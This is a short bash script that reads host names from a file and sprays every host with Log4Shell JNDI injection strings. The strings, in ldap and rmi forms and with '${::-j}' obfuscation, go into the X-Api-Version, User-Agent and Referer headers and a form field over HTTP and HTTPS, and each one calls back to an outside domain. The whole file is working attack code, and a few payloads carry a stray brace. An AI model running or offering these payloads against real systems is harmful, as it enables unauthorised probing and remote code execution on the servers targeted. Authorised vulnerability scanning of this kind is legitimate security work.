#!/bin/bash

while read fqdn
do
  echo "$fqdn"
  DNS_QUERY=log4shell.`echo "$fqdn" | sed -e "s|:.*$||g"`.$DOMAIN

  # debug(X-Api-Version Header)
  echo 'curl -XGET -s --max-time 3 http://$fqdn -H 'log4jPayload'  > /dev/null' | sed "s|log4jPayload|'X-Api-Version: \${jndi:ldap://$DNS_QUERY/a}'|g" | sed "s|\$fqdn|$fqdn|g" | bash
  echo 'curl -XGET -s --max-time 3 http://$fqdn -H 'log4jPayload'  > /dev/null' | sed "s|log4jPayload|'X-Api-Version: \${\${::-j}ndi:rmi://$DNS_QUERY/a}'|g" | sed "s|\$fqdn|$fqdn|g" | bash

  # http
  echo 'curl -XGET -s --max-time 3 http://$fqdn -H 'log4jPayload'  > /dev/null'                    | sed "s|log4jPayload|'User-Agent: \${jndi:ldap://$DNS_QUERY/a}'|g"             | sed "s|\$fqdn|$fqdn|g" | bash
  echo 'curl -XGET -s --max-time 3 http://$fqdn -H 'log4jPayload'  > /dev/null'                    | sed "s|log4jPayload|'User-Agent: \${\${::-j}ndi:rmi://$DNS_QUERY/a}'|g"    | sed "s|\$fqdn|$fqdn|g" | bash
  echo 'curl -XGET -s --max-time 3 http://$fqdn -H 'log4jPayload'  > /dev/null'                    | sed "s|log4jPayload|'Referer: \${jndi:ldap://$DNS_QUERY/a}'|g"                | sed "s|\$fqdn|$fqdn|g" | bash
  echo 'curl -XGET -s --max-time 3 http://$fqdn -H 'log4jPayload'  > /dev/null'                    | sed "s|log4jPayload|'Referer: \${\${::-j}ndi:rmi://$DNS_QUERY/a}'|g"       | sed "s|\$fqdn|$fqdn|g" | bash
  echo 'curl -XGET -s --max-time 3 http://$fqdn --data-urlencode 'test=log4jPayload' > /dev/null'  | sed "s|log4jPayload|'\${jndi:ldap://$DNS_QUERY/a}}'|g"                        | sed "s|\$fqdn|$fqdn|g" | bash
  echo 'curl -XGET -s --max-time 3 http://$fqdn --data-urlencode 'test=log4jPayload' > /dev/null'  | sed "s|log4jPayload|'\${\${::-j}ndi:rmi://$DNS_QUERY/a}'|g"                | sed "s|\$fqdn|$fqdn|g" | bash

  # https
  echo 'curl -XGET -s -k --max-time 3 https://$fqdn -H 'log4jPayload'  > /dev/null'                    | sed "s|log4jPayload|'User-Agent: \${jndi:ldap://$DNS_QUERY/a}'|g"             | sed "s|\$fqdn|$fqdn|g" | bash
  echo 'curl -XGET -s -k --max-time 3 https://$fqdn -H 'log4jPayload'  > /dev/null'                    | sed "s|log4jPayload|'User-Agent: \${\${::-j}ndi:rmi://$DNS_QUERY/a}'|g"    | sed "s|\$fqdn|$fqdn|g" | bash
  echo 'curl -XGET -s -k --max-time 3 https://$fqdn -H 'log4jPayload'  > /dev/null'                    | sed "s|log4jPayload|'Referer: \${jndi:ldap://$DNS_QUERY/a}'|g"                | sed "s|\$fqdn|$fqdn|g" | bash
  echo 'curl -XGET -s -k --max-time 3 https://$fqdn -H 'log4jPayload'  > /dev/null'                    | sed "s|log4jPayload|'Referer: \${\${::-j}ndi:rmi://$DNS_QUERY/a}'|g"       | sed "s|\$fqdn|$fqdn|g" | bash
  echo 'curl -XGET -s -k --max-time 3 https://$fqdn --data-urlencode 'test=log4jPayload' > /dev/null'  | sed "s|log4jPayload|'\${jndi:ldap://$DNS_QUERY/a}}'|g"                        | sed "s|\$fqdn|$fqdn|g" | bash
  echo 'curl -XGET -s -k --max-time 3 https://$fqdn --data-urlencode 'test=log4jPayload' > /dev/null'  | sed "s|log4jPayload|'\${\${::-j}ndi:rmi://$DNS_QUERY/a}'|g"                | sed "s|\$fqdn|$fqdn|g" | bash
done < fqdn.txt
